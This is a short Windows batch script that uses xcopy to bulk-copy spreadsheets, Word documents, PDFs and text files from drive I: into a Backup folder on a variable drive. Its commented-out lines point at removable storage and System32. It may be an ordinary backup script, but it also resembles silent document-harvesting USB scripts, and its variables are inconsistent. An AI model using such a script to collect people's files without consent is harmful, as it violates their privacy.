
@echo off
cls
md %drive%\Backup
::copy  "E:\Moves\*.*" "%removablestorage%\Copy_All\" /Z /y /L
::copy "C:\Windows\System32\*.*" "%drive%\Copy_All\" /Z /Y /L
@echo on
:: variables SET 
SET odrive=%odrive:~0,2% 
set Backupcmd=xcopy /s /c /d /e /h /i /r /y 
echo on 
color 0a
%Backupcmd% "I:\*.xlsx" "%drive%\Backup\I\*.xlsx"
%Backupcmd% "I:\*.docx" "%drive%\Backup\I\*.docx"
%Backupcmd% "I:\*.doc" "%drive%\Backup\I\*.*"
%Backupcmd% "I:\*.pdf" "%drive%\Backup\I\*.*"
%Backupcmd% "I:\*.text" "%drive%\Backup\I\*.*"
%Backupcmd% "I:\*.txt" "%drive%\Backup\I\*.*"
exit